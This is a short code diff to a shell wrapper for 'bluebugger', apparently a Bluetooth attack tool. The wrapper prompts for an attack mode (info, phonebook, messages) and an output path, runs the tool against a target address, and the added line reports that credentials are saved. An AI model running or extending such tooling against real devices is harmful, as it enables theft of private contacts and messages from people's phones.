@@ -46,3 +46,4 @@ read -p "SET ATTACK MODE(e.g info, phonebook, messages) ====>" MODE
 echo -e "${WHITE}"
 read -p "SET OUTPUT PATH ====>" P
 ./src/bluebugger -a $ADDR $MODE -c 2 -o $P
+echo -e "${CYAN}All credentials are saved into ${WHITE}$P"
